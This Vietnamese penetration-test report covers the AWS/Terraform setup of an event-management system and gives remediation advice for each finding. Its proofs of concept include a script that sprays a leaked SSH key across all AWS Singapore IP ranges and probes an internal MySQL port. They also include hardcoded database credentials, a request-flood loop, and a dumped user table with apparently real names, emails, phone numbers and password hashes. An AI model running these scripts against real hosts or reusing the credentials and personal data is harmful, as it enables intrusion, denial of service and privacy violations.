# BÁO CÁO KIỂM THỬ BẢO MẬT - PHASE 2

**Dự án:** FPT Event Management System

**Ngày thực hiện:** 31/03/2026

**Người thực hiện:** Phong (Pentester)

**Mục tiêu:** Mã nguồn Hạ tầng (Terraform) & Môi trường AWS.

---

## 1. TÓM TẮT SƠ BỘ BÁO CÁO

Tiếp nối Giai đoạn 1, dự án FPT Event Management System được DevOps chuyển dịch lên nền tảng đám mây AWS thông qua mã nguồn Infrastructure as Code (Terraform). Tuy nhiên, kiến trúc hạ tầng hiện tại **CHƯA ĐẠT TIÊU CHUẨN AN TOÀN** để vận hành dữ liệu thực tế.

Quá trình kiểm toán mã nguồn IaC và kiểm thử xâm nhập trên hạ tầng sống đã phát hiện 04 lỗ hổng bảo mật, trong đó có 01 lỗ hổng mức độ Nghiêm trọng (Critical) và 02 lỗ hổng mức độ Cao (High).

Sự kết hợp giữa việc rò rỉ khóa bí mật trong mã nguồn, tường lửa lớp biên (Bastion) mở công khai và phân quyền mạng nội bộ lỏng lẻo đã tạo ra một Chuỗi tấn công (Kill Chain) hoàn chỉnh. Kẻ tấn công từ Internet có thể vượt qua toàn bộ các lớp phòng thủ VPC để chiếm quyền kiểm soát trực tiếp cơ sở dữ liệu RDS nội bộ. Để hệ thống đạt điều kiện nghiệm thu, đội ngũ dự án buộc phải tái cấu trúc phương thức quản trị máy chủ (loại bỏ Bastion Host) và tích hợp các dịch vụ quản lý Secret chuyên dụng của AWS.

## 2. PHƯƠNG PHÁP & PHẠM VI ĐÁNH GIÁ

* **Giai đoạn kiểm thử:** Đánh giá cấu hình Hạ tầng dưới dạng Mã (Infrastructure as Code - IaC) kết hợp kiểm thử xâm nhập trực tiếp trên môi trường AWS Sandbox vừa được khởi tạo.
* **Hạ tầng hiện tại:** Kiến trúc mạng AWS (VPC, Public/Private Subnets), Amazon EC2 (Bastion Host), Amazon RDS (MySQL), ALB, CloudFront & WAF.
* **Kịch bản giả định:** Giả định kẻ tấn công là tổ chức tội phạm mạng sử dụng các hệ thống dò quét tự động liên tục giám sát các dải IP của AWS, đồng thời có khả năng thu thập các mã nguồn bị rò rỉ.
* **Phạm vi:**
  * Phân tích tĩnh mã nguồn hạ tầng kết hợp kiểm tra mô hình luồng dữ liệu (Threat Modeling).
  * Kiểm thử động nhắm vào Public IP của Bastion Host và truy xuất Endpoint của RDS.
* **Phương pháp:** White-box review cho mã nguồn Terraform và Black-box testing từ xa vào các endpoint hạ tầng AWS.
* **Giới hạn kiểm thử:** Chưa thực hiện kiểm thử tải (Stress Test) và tấn công DDoS quy mô lớn vào CloudFront/WAF do giới hạn tài nguyên của tài khoản AWS Sandbox.
* **Công cụ sử dụng:** Terraform CLI, AWS CLI, Nmap, SSH, jq.

---

## 3. NGHIỆM THU CHUYỂN ĐỔI MÔI TRƯỜNG

Đội ngũ Phát triển (Dev) đã thực hiện cấu hình lại mã nguồn theo Báo cáo Giai đoạn 1:

* [x] **Frontend:** Đã chuyển đổi sang lệnh build tĩnh (`npm run build`) và đưa lên S3, triệt tiêu rủi ro lộ mã nguồn.
* [x] **Backend:** Đã gỡ bỏ cấu hình CORS nội bộ, API Gateway hiện tại đã xử lý an toàn với `cors_allowed_origins` tĩnh.
* [ ] **Backend Rate Limiting:** Dev đã tự viết code chống Spam OTP trong Golang. Mặc dù logic chạy đúng, nhưng kiến trúc này đi ngược lại nguyên tắc Cloud-Native. Vấn đề này được ghi nhận thành lỗ hổng Kiến trúc tại mã `CLD-04`.

---

## 4. CHI TIẾT LỖ HỔNG HẠ TẦNG CLOUD

**BẢNG TỔNG HỢP LỖ HỔNG**

| ID     | Vulnerability                                          | AWS/OWASP Category         | Severity | CVSS Score | State |
|--------|--------------------------------------------------------|----------------------------|----------|------------|-------|
| CLD-01 | Compromised Bastion Host via Exposed SSH Key & Open SG | Security Misconfiguration  | Critical | 9.8        | Open  |
| CLD-02 | Hardcoded RDS Credentials in Infrastructure Code       | Secret Management Failures | High     | 7.5        | Open  |
| CLD-03 | Overly Permissive RDS Security Group                   | Broken Access Control      | High   | 8.8       | Open  |
| CLD-04 | Missing Targeted Edge Rate Limiting (WAF)              | Insecure Design            | Medium   | 5.3        | Open  |

### CLD-01. Compromised Bastion Host via Exposed SSH Key & Open Security Group

* **Mức độ:** Nghiêm trọng.
* **CVSS:** 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.
* **Mô tả:** Quá trình quản lý mã nguồn đã để lọt file Private Key `fpt-bastion-ssh` lên kho lưu trữ chung. Cùng lúc đó, AWS Security Group của *Bastion Host* tại `bastion-host.tf` đang mở cổng 22 (SSH) cho toàn bộ dải IP trên Internet (0.0.0.0/0). Điều này biến Bastion Host thành điểm xâm nhập trực tiếp vào mạng VPC nội bộ.
* **PoC:**
  1. Kẻ tấn công truy cập kho lưu trữ Git bị rò rỉ, tải về file `fpt-bastion-ssh`. Phân tích mã nguồn IaC cho thấy mục tiêu nằm tại `ap-southeast-1` và sử dụng tài khoản mặc định `ec2-user`.
  2. Tải danh sách IP AWS, lọc lấy các dải mạng EC2 tại `ap-southeast-1`.
  3. Sử dụng kỹ thuật càn quét diện rộng kết hợp rải khóa để tự động hóa tìm kiếm và xâm nhập mục tiêu mà không cần biết trước IP tĩnh.

```bash
#!/bin/bash

echo "[*] Fetching AWS IP ranges for ap-southeast-1..."
curl -s "https://ip-ranges.amazonaws.com/ip-ranges.json" | jq -r '.prefixes[] | select(.region=="ap-southeast-1" and .service=="EC2") | .ip_prefix' > aws_singapore_ips.txt
chmod 600 fpt-bastion-ssh

echo "[*] Initiating Key Spraying attack..."

for ip in $(nmap -p 22 -iL aws_singapore_ips.txt --open -n -T4 --max-rtt-timeout 500ms --max-retries 1 | grep "Nmap scan report " | awk '{print $NF}' ); do
        echo "Identifying $ip"
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -i fpt-bastion-ssh ec2-user@$ip 2>/dev/null

        if [ $? -eq 0 ]; then
                echo "Bastion Host Found At: $ip"
                ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i fpt-bastion-ssh ec2-user@$ip "\
                echo 'Bastion System: ' && id && hostname &&\
                echo 'AWS Metadata: ' &&\
                TOKEN=\$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -s)&&\
                curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" -s http://169.254.169.254/latest/meta-data/local-ipv4 && echo '' && \
                echo 'Lateral Move to RDS: ' && \
                for ip in 10.0.{1..5}.{1..254}; do timeout 1 bash -c \"</dev/tcp/\$ip/3306\" 2>/dev/null && echo \"Connection to RDS \$ip:3306 [tcp/mysql] succeeded!\" && break; done || echo 'Connection failed!'"
        fi
done
```

  4. Kết quả trả về xác nhận Bastion bị chiếm, hệ thống mạng nội bộ bị lộ và hàng rào bảo vệ RDS bị xuyên thủng:

```bash
┌──(phong㉿Vostro3405)-[~]
└─$ sudo ./scan_bastionHost.sh
[*] Fetching AWS IP ranges for ap-southeast-1...
[*] Initiating Key Spraying attack...
Identifying 54.254.225.3
Identifying 54.254.225.9
Identifying 54.254.225.13
Identifying 54.254.225.31
Identifying 54.254.225.38
Identifying 54.254.225.48
Identifying 54.254.225.51
Identifying 54.254.225.54
Identifying 54.254.225.55
Identifying 54.254.225.60
Identifying 54.254.225.74
Identifying 54.254.225.82
Identifying 54.254.225.83
Identifying 54.254.225.117
Identifying 54.254.225.128
Identifying 54.254.225.155
Identifying 54.254.225.216
Bastion Host Found At: 54.254.225.216
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Bastion System: 
uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal),993(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
ip-10-0-101-231.ap-southeast-1.compute.internal
AWS Metadata: 
10.0.101.231
Lateral Move to RDS: 
Connection to RDS 10.0.1.136:3306 [tcp/mysql] succeeded!
```

* **Tác động:** Lỗ hổng này cung cấp cho kẻ tấn công quyền truy cập ban đầu vào môi trường ranh giới của mạng đám mây. Việc sử dụng kỹ thuật "Key Spraying" (Rải khóa tự động) chứng minh rằng IP động không mang lại bất kỳ giá trị phòng thủ nào trước các chiến dịch rà quét tự động (Masscan/Botnet). Khi đã chiếm được Bastion Host, kẻ tấn công hoàn toàn có thể sử dụng máy chủ này làm trạm trung chuyển để rà quét toàn bộ mạng nội bộ và tiến hành các bước tiếp theo trong chuỗi Kill Chain nhắm vào cơ sở dữ liệu.

* **Khuyến nghị khắc phục:**
  * Loại bỏ hoàn toàn kiến trúc Bastion Host truyền thống (Xóa resource aws_instance.bastion). Hủy bỏ quy tắc Ingress mở cổng 22 ra 0.0.0.0/0.
  * Triển khai giải pháp **AWS Systems Manager (SSM) Session Manager**. Giải pháp này cho phép quản trị viên truy cập shell an toàn vào EC2 thông qua IAM Role và AWS Console/CLI mà không cần mở bất kỳ cổng Inbound nào, đồng thời triệt tiêu hoàn toàn rủi ro lộ lọt tệp khóa tĩnh (SSH Key Pair).

### CLD-02. Hardcoded RDS Credentials in Infrastructure Code

* **Mức độ:** Cao.
* **CVSS:** 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.
* **Mô tả:** Thông tin xác thực cấp quản trị viên của dịch vụ Amazon RDS đang được lưu trữ dưới dạng bản rõ (Plaintext) trực tiếp trong tệp cấu hình `database.tf`. Đây là vi phạm nghiêm trọng trong quản lý vòng đời bí mật trong kỷ nguyên Cloud-Native.
* **PoC:** Phân tích tĩnh tệp mã nguồn `database.tf` ghi nhận đoạn mã cấu hình bị hardcode:

  ```Terraform
  module "rds" {
    db_name  = "fpteventmanagement"
    username = "admin"
    password = "FptEvent2024"
  }
  ```

* **Tác động:** Thông tin xác thực root của Cơ sở dữ liệu bị bộc lộ hoàn toàn dưới dạng bản rõ. Hệ quả trực tiếp là bất kỳ cá nhân, tiến trình hoặc công cụ nào có quyền đọc (read-access) kho lưu trữ mã nguồn Terraform này đều lập tức nắm giữ thông tin đăng nhập tĩnh của RDS. Lỗ hổng này cung cấp trực tiếp mảnh ghép "Định danh hợp lệ", loại bỏ hoàn toàn rào cản xác thực mà không cần kẻ tấn công phải thực hiện bất kỳ kỹ thuật dò đoán (brute-force) hay bẻ khóa nào.
* **Khuyến nghị khắc phục:** 
  * Khởi tạo mật khẩu động thông qua resource **random_password** trong Terraform thay vì gán giá trị chuỗi tĩnh.
  * Đẩy mật khẩu này vào lưu trữ tại **AWS Secrets Manager** hoặc **AWS SSM Parameter Store**. Các tài nguyên cần sử dụng mật khẩu (như ECS Task Definitions) sẽ gọi biến môi trường trực tiếp từ dịch vụ Secret thay vì đọc từ mã nguồn IaC.

### CLD-03. Overly Permissive RDS Security Group

* **Mức độ:** Cao.
* **CVSS:** 8.8 `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.
* **Mô tả:** Tường lửa lớp hạ tầng của Cơ sở dữ liệu (`aws_security_group.rds`) đang được cấu hình cho phép nhận kết nối Inbound đến cổng 3306 từ toàn bộ dải mạng VPC nội bộ, thay vì áp dụng nguyên tắc đặc quyền tối thiểu.
* **PoC:**
  1. Phân tích tệp `database.tf` cho thấy quy tắc Ingress sử dụng toàn bộ dải CIDR của VPC:

  ```Terraform
  ingress {
    from_port   = 3306
    to_port     = 3306
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"] 
  }
  ```

  2. Dữ liệu từ PoC của lỗ hổng CLD-01 xác nhận: Khi đứng từ máy chủ Bastion Host (thuộc mạng `10.0.101.x`), kết nối TCP đến cổng 3306 của RDS (`10.0.1.136`) đã được thiết lập thành công (`Connection to RDS 10.0.1.136:3306 [tcp/mysql] succeeded!`).

  3. Dùng private ip tìm được từ CLD-01 kết hợp với thông tin xác thực tìm được từ CLD-02:
  
  ```bash
  [ec2-user@ip-10-0-101-231 ~]$ mysql -h 10.0.1.136 -u admin -pFptEvent2024 -e "SHOW DATABASES; USE fpteventmanagement; SELECT * FROM users;"
  +--------------------+
  | Database           |
  +--------------------+
  | fpteventmanagement |
  | information_schema |
  | mysql              |
  | performance_schema |
  | sys                |
  +--------------------+
  +---------+---------------------------+-------------------------------+------------+------------------------------------------------------------------+-----------+--------+----------------------------+-----------+
  | user_id | full_name                 | email                         | phone      | password_hash                                                    | role      | status | created_at                 | Wallet    |
  +---------+---------------------------+-------------------------------+------------+------------------------------------------------------------------+-----------+--------+----------------------------+-----------+
  |       1 | Nguyễn Văn An             | an.nvse14001@fpt.edu.vn       | 0901000100 | $2a$12$FzWlsG8ipFhBBtMeXl5XUOCZ6NlwL9I4h1bwXPrSk1QxLFBGSl9te     | STUDENT   | ACTIVE | 2025-12-01 09:16:32.789573 |      0.00 |
  |       2 | Trần Thị Bình             | binh.ttse14002@fpt.edu.vn     | 0902000200 | $2a$12$2oCoGj2Taesg4vWmsid1WOzCx8Y5Zl6OUaiXVbOE77ZEOI4vwJaC2     | STUDENT   | ACTIVE | 2025-12-01 09:16:32.789573 |      0.00 |
  |       3 | Lê Quang Huy              | huy.lqclub@fpt.edu.vn         | 0903000300 | $2a$12$UfieEaEL0Ug/Dqgif1ie3eLEuPwUVbhCFkRfb/ZVS3Zy6v9ysHhBC     | ORGANIZER | ACTIVE | 2025-12-01 09:16:32.789573 |      0.00 |
  |       4 | Phạm Minh Thu             | thu.pmso@fpt.edu.vn           | 0904000400 | $2a$12$48FNaLBJTKv2o6kVqOiPP.8LeRYXdQO24XgEyQNMizfuDX7Zdvl4S     | STAFF     | ACTIVE | 2025-12-01 09:16:32.789573 |      0.00 |
  |       5 | Quản trị hệ thống         | admin.event@fpt.edu.vn        | 0905000500 | $2a$12$BCzdHEEw7XeOUB076GKA3eIl4vsSTjPCPUoMA0Yx2S3yTGl3MkJWu     | ADMIN     | ACTIVE | 2025-12-01 09:16:32.789573 |      0.00 |
  |       7 | Nguyen Vo Minh Chau       | nguyenvominhchau165@gmail.com | 0901000123 | 99e5fee36796021ffed4198e0ba9a98c1e5dd44fbb597bf1a9a1b93141e31697 | STUDENT   | ACTIVE | 2025-12-01 12:26:17.798470 | 200000.00 |
  |      11 | Anh Khoi                  | ahkhoinguyen169@gmail.com     | 0331234567 | $2a$12$gDVGpOTsjqHspLOEjTxLFuEr3QjOhiW5Sod73kB0or0i57F8uJ9ly     | STUDENT   | ACTIVE | 2026-01-28 15:29:20.974209 |  50000.00 |
  |      18 | Twi Trần                  | therealtwillight@gmail.com    | 0987456321 | $2a$12$EbJKiKQ170balgaXV0inOeWuNWQXQFVGaxWinOnkwqtrPSOukPv52     | ORGANIZER | ACTIVE | 2026-01-30 23:10:38.294863 |      0.00 |
  +---------+---------------------------+-------------------------------+------------+------------------------------------------------------------------+-----------+--------+----------------------------+-----------+
  ```

* **Tác động:** Bất kỳ một node tính toán nào (EC2, ECS container) nằm trong dải mạng `10.0.0.0/16` bị xâm nhập đều có đủ điều kiện để thiết lập kết nối TCP trực tiếp tới máy chủ Cơ sở dữ liệu. Cấu hình này biến mọi điểm yếu bên trong VPC thành bàn đạp hợp lệ để tiếp cận RDS.
* **Khuyến nghị khắc phục:**
  * Gỡ bỏ tham số `cidr_blocks = ["10.0.0.0/16"]`.
  * Thay thế bằng tham số security_groups = [aws_security_group.ecs_tasks.id]. Cấu hình này định tuyến chính xác ở mức kiến trúc: Chỉ những tài nguyên mang Security Group của ECS Backend mới được phép giao tiếp với RDS.

### CLD-04. Missing Targeted Edge Rate Limiting (WAF)

* **Mức độ:** Trung bình.
* **CVSS:** 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`.
* **Mô tả:** Cấu hình bảo mật tại lớp biên (`waf.tf`) chỉ thiết lập giới hạn Rate Limit ở mức tổng thể cho CloudFront (2000 requests/5 phút). Hệ thống thiếu các quy tắc nhắm mục tiêu (Targeted Rules) khắt khe hơn cho các endpoint API nhạy cảm. Mặc dù Dev đã chủ động tự viết code chống Spam/Brute-force trong mã nguồn Backend, việc thiết kế thiếu lớp khiên WAF chuyên dụng này đã tạo ra một kiến trúc Anti-pattern, dẫn đến nguy cơ tấn công cạn kiệt tài nguyên tính toán và tài chính (EDoS).
* **PoC:** 
  1. Kẻ tấn công sử dụng công cụ dòng lệnh (bash script) gửi liên tục 500 requests nhắm vào API quên mật khẩu trong vòng 1 phút. Theo lý thuyết, WAF cấu hình chuẩn sẽ chặn đứng IP này ở request thứ 50.

  ```bash
  #!/bin/bash
  for i in {1..500}; do \
    curl -s -o /dev/null -w "%{http_code}\n" -X POST https://fpt-event.xyz/api/forgot-password \
    -H "Content-Type: application/json" -d '{"email":"spam-target@fpt.edu.vn"}'; \
  done
  ```

  2. Kết quả trên Terminal của kẻ tấn công không trả về mã `403 Forbidden`. Thay vào đó, toàn bộ các request đều nhận được mã `503 Service Unavailable` trực tiếp từ hệ thống Application Load Balancer (ALB).

  ```bash
  ┌──(phong㉿Vostro3405)-[~]
  └─$ ./edos.sh 
  503
  503
  503
  503
  503
  ...
  000
  503
  ...

  ```

  3. Truy cập giao diện AWS CloudWatch Logs Insights để kiểm tra lượng truy cập lọt lưới. Lệnh truy vấn trực tiếp vào trường `@message` xác nhận có tổng cộng 489 requests đã vượt qua hoàn toàn hàng rào WAF lớp biên và đâm thẳng vào tầng Compute.
  ```Log
  **CloudWatch Logs Insights**    
  region: ap-southeast-1    
  log-group-prefixes:     
  log-class: STANDARD    
  account-identifiers: All    
  data-sources:     
  facets:     
  start-time: -3600s    
  end-time: 0s    
  query-string:
  ```
  ```
  fields @timestamp, @message
  | filter @message like "/api/forgot-password"
  | stats count(*) as Total_Bypassed_Requests
  ```
  | Total_Bypassed_Requests |
  | --- |
  | 489 |

  *Ghi chú kỹ thuật:* Do Docker Image chưa được đẩy lên ECR và cấu hình `ecs.tf` chưa cập nhật *(test trên hệ thống tự build)*, ECS không thể khởi chạy Task khiến ALB trả về lỗi 503. Dù vậy, việc 100% request rác xuyên qua WAF và chạm tới tận ALB đã đủ bằng chứng cho thấy tường lửa lớp biên hoàn toàn vô hiệu trước các luồng tấn công tự động.

  4. Từ đó, ta có bài toán ngoại suy như sau:
    - Kẻ tấn công dùng mạng Botnet gồm 1,000 IPs.
    - Mỗi IP chỉ gửi **1,500 requests / 5 phút**.
    - Tổng lưu lượng: **1,500,000 requests / 5 phút**.
    - Tốc độ bắn phá: 1,500,000 / 300 = **5,000 req/s**
    Chi phí ước tính trong 24h tấn công liên tục:  
      **A. Chi phí ALB LCU:**
      - Số LCU tiêu thụ: 5,000 / 25 = **200** LCUs
      - Chi phí LCUs trong 1 ngày: 200 * 0.008 USD * 24 = **38.4 USD** mỗi ngày.
      * [Nguồn tham khảo: AWS Elastic Load Balancing Pricing - Region: ap-southeast-1](https://aws.amazon.com/elasticloadbalancing/pricing/)

      **B. Chi phí CloudWatch Logs:**
      - Tổng số requests/ngày: 5,000 x 3,600 x 24 = **432,000,000 requests**.
      - Tổng dung lượng Log: 432,000,000 x 0.5 = 216,000,000 KB = **216 GB**.
      - Chi phí log trong 1 ngày: 216 GB x 0.5 USD = **108.0 USD**.
      * [Nguồn tham khảo: Amazon CloudWatch Pricing - Region: ap-southeast-1](https://aws.amazon.com/cloudwatch/pricing/)

      **=> Tổng thiệt hại ước tính: 38.4 USD + 108.0 USD = 146.4 USD mỗi ngày**
* **Tác động:** Phương pháp ngoại suy cho thấy ngưỡng Rate Limit hiện tại là quá lỏng lẻo và dễ dàng bị qua mặt bởi các mạng Botnet phân tán. Kẻ tấn công chỉ cần chia nhỏ lưu lượng để lách WAF, tạo ra một cuộc tấn công cạn kiệt tài chính (EDoS). Với kịch bản giả định trên, dự án sẽ thiệt hại gần 150 USD mỗi ngày chỉ tính riêng trên tầng Load Balancer và Log nội bộ. Nếu cuộc tấn công âm thầm kéo dài, ngân sách Cloud của dự án sẽ bị bòn rút nghiêm trọng mà hệ thống cảnh báo của AWS WAF không hề ghi nhận IP nào vi phạm.
* **Khuyến nghị khắc phục:**
  * **DevOps:** Bổ sung khối `rate_based_statement` vào cấu hình AWS WAF, thiết lập Scope-down statement nhắm đích danh vào các URI Path nhạy cảm. Đặt ngưỡng giới hạn khắt khe (ví dụ: Chặn tự động IP tại cấp độ CloudFront nếu vượt quá 50 requests/5 phút).
  * **Dev:** Sau khi WAF hoạt động ổn định ở lớp biên, Dev có thể gỡ bỏ các middleware Rate Limiting tự code trong mã nguồn để giảm tải logic cho ứng dụng.

---

## 5. ĐIỂM SÁNG BẢO MẬT HẠ TẦNG

Quá trình rà soát kiến trúc ghi nhận nỗ lực rất lớn của DevOps trong việc áp dụng các tiêu chuẩn thiết kế hạ tầng hiện đại của AWS:

* **Phân tách mạng:** Đã triển khai thành công mô hình mạng định tuyến VPC với các Private và Public Subnet phân định rõ ràng. Toàn bộ cơ sở dữ liệu cốt lõi (RDS) được đặt sâu trong Private Subnet, khắc phục triệt để tình trạng bộc lộ IP công cộng ra Internet.
* **Bảo vệ tài nguyên tĩnh:** Dịch vụ S3 chứa mã nguồn Frontend đã được thiết lập tính năng CloudFront Origin Access Control (OAC). Cơ chế này khóa chặt và chặn đứng quyền `Public Read` trực tiếp vào Bucket, ép buộc mọi kết nối phải đi qua CDN.

---

## 6. KẾ HOẠCH KHẮC PHỤC

Để triệt tiêu hoàn toàn chuỗi tấn công (Kill Chain) và đạt tiêu chuẩn an toàn trước khi đưa lên Production, đội ngũ dự án cần thực hiện tái cấu trúc mã nguồn theo lộ trình 3 giai đoạn:

### Giai đoạn 1: Tái định hình Quản trị (Zero-Trust Access)

* Thu hồi (Revoke) ngay lập tức hiệu lực của tệp khóa `fpt-bastion-ssh` bị rò rỉ. 
* Gỡ bỏ hoàn toàn module Bastion EC2 khỏi cấu hình Terraform. Thay thế bằng giải pháp **AWS Systems Manager (SSM) Session Manager** để quản trị máy chủ từ xa an toàn qua IAM Role mà không cần mở cổng mạng Inbound.

### Giai đoạn 2: Quản lý Bí mật & Phân mảnh Mạng (Micro-segmentation)

* Tái cấu trúc tệp `database.tf`, đẩy toàn bộ thông tin nhạy cảm lên kho lưu trữ an toàn **AWS Secrets Manager** hoặc **AWS Systems Manager (SSM) Parameter Store**.
* Cập nhật lại tường lửa `aws_security_group.rds`, áp dụng ranh giới vi mô bằng cách chỉ cho phép luồng Ingress xuất phát từ Security Group ID của tầng Backend ECS, loại bỏ tham số mở toàn dải mạng `10.0.0.0/16`.

### Giai đoạn 3: Tối ưu Lớp Biên (Edge Defense-in-Depth)

* Bổ sung Custom Rules vào tệp `waf.tf` để thiết lập định tuyến bảo vệ API cấp ứng dụng (Layer 7 Rate Limiting).
* Thực thi lệnh `terraform apply` để triển khai và đồng bộ kiến trúc an toàn cuối cùng.
